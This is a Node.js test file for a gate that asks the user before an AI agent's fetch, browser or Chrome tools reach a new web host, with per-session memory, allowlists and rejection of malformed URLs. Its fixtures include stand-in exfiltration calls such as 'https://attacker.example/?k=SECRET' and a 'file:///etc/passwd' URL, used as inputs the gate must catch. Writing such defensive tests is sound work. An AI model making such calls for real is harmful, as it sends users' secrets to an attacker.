import assert from 'node:assert/strict'
import { test } from 'node:test'
import { createSiteApproval, hostAllowed, hostOf, isLocal, normalizeHosts } from '../site-approval.js'

const allow = () => Promise.resolve({ kind: 'allow' })

function gateWith({ network = 'on', allowedHosts = [], full = false } = {}) {
  const setting = { network, allowedHosts }
  const gate = createSiteApproval({ readNetwork: async () => setting, fullAccess: () => full })
  return { gate, setting }
}

let calls = 0
function call(name, args, session) {
  calls += 1
  return { name, arguments: args, callId: `call-${calls}`, agent: session === undefined ? undefined : { session } }
}

test('hosts are read from http(s) URLs only', () => {
  assert.equal(hostOf('https://Example.COM./path?q=1'), 'example.com')
  assert.equal(hostOf('http://[::1]:3000/'), '::1')
  assert.equal(hostOf('http://2130706433/'), '127.0.0.1')
  assert.equal(hostOf('file:///etc/passwd'), undefined)
  assert.equal(hostOf('not a url'), undefined)
  assert.equal(hostOf(undefined), undefined)
})

test('this computer counts as local; the network does not', () => {
  for (const host of ['localhost', 'app.localhost', '127.0.0.1', '127.1.2.3', '::1', '0.0.0.0', hostOf('http://[::ffff:127.0.0.1]/')]) {
    assert.equal(isLocal(host), true, host)
  }
  for (const host of ['example.com', 'localhost.example.com', '10.0.0.1', '192.168.1.5', '::ffff:a00:1']) {
    assert.equal(isLocal(host), false, host)
  }
})

test('allowlist entries match as the command proxy matches them', () => {
  const hosts = normalizeHosts(['https://Registry.npmjs.org/', '*.github.com', 'bad host', 42, 'pypi.org:443'])
  assert.deepEqual(hosts, ['registry.npmjs.org', '*.github.com', 'pypi.org'])
  assert.equal(hostAllowed('registry.npmjs.org', hosts), true)
  assert.equal(hostAllowed('api.github.com', hosts), true)
  assert.equal(hostAllowed('github.com', hosts), false)
  assert.equal(hostAllowed('evilgithub.com', hosts), false)
  assert.equal(hostAllowed('npmjs.org', hosts), false)
})

test('a new site asks once per session, and is remembered only after the call runs', async () => {
  const { gate } = gateWith()
  const session = {}
  const first = call('web_fetch', { url: 'https://attacker.example/?k=SECRET' }, session)
  const decision = await gate.preExecute(first, allow)
  assert.equal(decision.kind, 'ask')
  assert.match(decision.reason, /web_fetch would reach attacker\.example/)
  assert.match(decision.displayReason.en, /fetch attacker\.example\?/)

  // Rejected: the call never runs, so the next call to that site asks again.
  const again = call('web_fetch', { url: 'https://attacker.example/' }, session)
  assert.equal((await gate.preExecute(again, allow)).kind, 'ask')

  // Allowed: the call runs, and the site is remembered for this session only.
  let ran = false
  await gate.execute(again, async () => { ran = true; return { isError: false } })
  assert.equal(ran, true)
  assert.deepEqual(gate.approvedHosts(session), ['attacker.example'])
  assert.equal((await gate.preExecute(call('browser_open', { url: 'http://attacker.example/x' }, session), allow)).kind, 'allow')
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://other.example/' }, session), allow)).kind, 'ask')
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://attacker.example/' }, {}), allow)).kind, 'ask')
})

test('a reused call id does not approve a site that was rejected, in this session or another', async () => {
  const { gate } = gateWith()
  const session = {}
  const other = {}
  const rejected = { name: 'web_fetch', arguments: { url: 'https://attacker.example/' }, callId: 'call-0', agent: { session } }
  assert.equal((await gate.preExecute(rejected, allow)).kind, 'ask')
  // The user rejects it, so it never runs. Later, unrelated calls reuse the same id and run.
  const sameIdHere = { name: 'read_file', arguments: { path: 'a.txt' }, callId: 'call-0', agent: { session } }
  const sameIdThere = { name: 'read_file', arguments: { path: 'a.txt' }, callId: 'call-0', agent: { session: other } }
  await gate.execute(sameIdHere, async () => ({ isError: false }))
  await gate.execute(sameIdThere, async () => ({ isError: false }))
  assert.deepEqual(gate.approvedHosts(session), [])
  assert.deepEqual(gate.approvedHosts(other), [])
  // A fresh call to the same site with the same id still asks; only that exact call, once run, records it.
  const retry = { name: 'web_fetch', arguments: { url: 'https://attacker.example/' }, callId: 'call-0', agent: { session } }
  assert.equal((await gate.preExecute(retry, allow)).kind, 'ask')
  await gate.execute(retry, async () => ({ isError: false }))
  assert.deepEqual(gate.approvedHosts(session), ['attacker.example'])
  assert.deepEqual(gate.approvedHosts(other), [])
})

test('an address that is not a string is refused, since the tools would turn it into one unchecked', async () => {
  const { gate } = gateWith()
  const session = {}
  for (const url of [['https://attacker.example/'], { href: 'https://attacker.example/' }, 42]) {
    for (const name of ['web_fetch', 'browser_open', 'mcp__chrome__chrome_open']) {
      const decision = await gate.preExecute(call(name, { url }, session), allow)
      assert.equal(decision.kind, 'deny', `${name} ${JSON.stringify(url)}`)
      assert.match(decision.reason, /url argument to be one web address written as text/)
    }
  }
  assert.equal((await gate.preExecute(call('browser_open', { url: null, action: 'reload' }, session), allow)).kind, 'allow')
  const full = gateWith({ full: true }).gate
  assert.equal((await full.preExecute(call('web_fetch', { url: ['https://attacker.example/'] }, session), allow)).kind, 'allow')
})

test('the Browser pane and Chrome are gated too; other tools and local pages are not', async () => {
  const { gate } = gateWith()
  const session = {}
  const open = await gate.preExecute(call('browser_open', { url: 'https://example.com/' }, session), allow)
  assert.equal(open.kind, 'ask')
  assert.match(open.displayReason.en, /open a page from example\.com/)
  const chrome = await gate.preExecute(call('mcp__chrome__chrome_open', { url: 'https://example.com/', tabId: 3 }, session), allow)
  assert.equal(chrome.kind, 'ask')
  assert.match(chrome.displayReason.en, /in your Chrome/)
  for (const exec of [
    call('browser_open', { url: 'http://localhost:3000/?q=anything' }, session),
    call('browser_open', { url: 'http://127.0.0.1:5173/' }, session),
    call('browser_open', { action: 'reload' }, session),
    call('web_search', { queries: ['https://example.com'] }, session),
    call('mcp__notes__open', { url: 'https://example.com/' }, session),
    call('web_fetch', { url: 'ftp://example.com/' }, session),
  ]) {
    assert.equal((await gate.preExecute(exec, allow)).kind, 'allow', JSON.stringify(exec))
  }
})

test('Only allowed sites lets its list through; the list is ignored while the network is On or Off', async () => {
  const { gate, setting } = gateWith({ network: 'allowlist', allowedHosts: ['*.github.com', 'pypi.org'] })
  const session = {}
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://raw.github.com/a' }, session), allow)).kind, 'allow')
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://pypi.org/simple' }, session), allow)).kind, 'allow')
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://example.com/' }, session), allow)).kind, 'ask')
  setting.network = 'on'
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://pypi.org/simple' }, session), allow)).kind, 'ask')
})

test('full access lifts the check', async () => {
  const { gate } = gateWith({ full: true })
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://example.com/' }, {}), allow)).kind, 'allow')
})

test('an earlier denial or question stands, and a call without a session still asks', async () => {
  const { gate } = gateWith()
  const deny = { kind: 'deny', reason: 'a hook said no' }
  assert.equal(await gate.preExecute(call('web_fetch', { url: 'https://example.com/' }, {}), async () => deny), deny)
  const ask = { kind: 'ask', reason: 'a rule asks' }
  assert.equal(await gate.preExecute(call('web_fetch', { url: 'https://example.com/' }, {}), async () => ask), ask)
  assert.equal((await gate.preExecute(call('web_fetch', { url: 'https://example.com/' }), allow)).kind, 'ask')
})

test('the shared check says whether a page a session ended up on is allowed', async () => {
  const session = {}
  const gate = createSiteApproval({ readNetwork: async () => ({ network: 'allowlist', allowedHosts: ['docs.example'] }), fullAccess: () => false })
  assert.equal(await gate.allows(session, 'http://localhost:3000/'), true)
  assert.equal(await gate.allows(session, 'https://docs.example/a'), true)
  assert.equal(await gate.allows(session, 'https://evil.example/'), false)
})

test('an always-allowed site never asks, in calls and on screen; others still do', async () => {
  const saved = ['example.com']
  const gate = createSiteApproval({ readNetwork: async () => ({ network: 'on', allowedHosts: [] }), fullAccess: () => false, readSites: async () => saved })
  const session = {}
  assert.deepEqual(await gate.preExecute(call('web_fetch', { url: 'https://example.com/a' }, session), allow), { kind: 'allow' })
  assert.equal(await gate.allows(session, 'https://example.com/b'), true)
  assert.equal(gate.isAsking('example.com'), false)
  const other = await gate.preExecute(call('web_fetch', { url: 'https://other.org/' }, session), allow)
  assert.equal(other.kind, 'ask')
  assert.match(other.displayReason.en, /^Let the agent fetch other\.org\? Each new site asks once per session/)
  assert.equal(gate.isAsking('other.org'), true, 'the card is asking, so it may be made always-allowed')
  assert.equal(await gate.allows(session, 'https://www.example.com/'), false, 'only the exact site, not its subdomains')
})

test('the site list keeps valid single site names, written atomically, and can remove them', async () => {
  const { mkdtemp, readFile, writeFile, rename, mkdir, rm } = await import('node:fs/promises')
  const { tmpdir } = await import('node:os')
  const path = await import('node:path')
  const dir = await mkdtemp(path.join(tmpdir(), 'hs-sites-'))
  const { createSiteList } = await import('../site-approval.js')
  const file = path.join(dir, 'nested', 'sites.json')
  const list = createSiteList(file, { writeFile, readFile, rename, mkdir, rm, dirname: path.dirname, randomSuffix: () => 'x' })
  assert.deepEqual(await list.get(), { hosts: [] })
  await list.add('Example.com')
  await list.add('example.com')
  assert.deepEqual(await list.get(), { hosts: ['example.com'] })
  await assert.rejects(list.add('*.evil.com'), /one site name/)
  await assert.rejects(list.add('bad host'), /one site name/)
  await list.add('docs.example.org')
  assert.deepEqual(JSON.parse(await readFile(file, 'utf8')).hosts, ['example.com', 'docs.example.org'])
  await list.remove('example.com')
  assert.deepEqual(await list.get(), { hosts: ['docs.example.org'] })
  await rm(dir, { recursive: true, force: true })
})
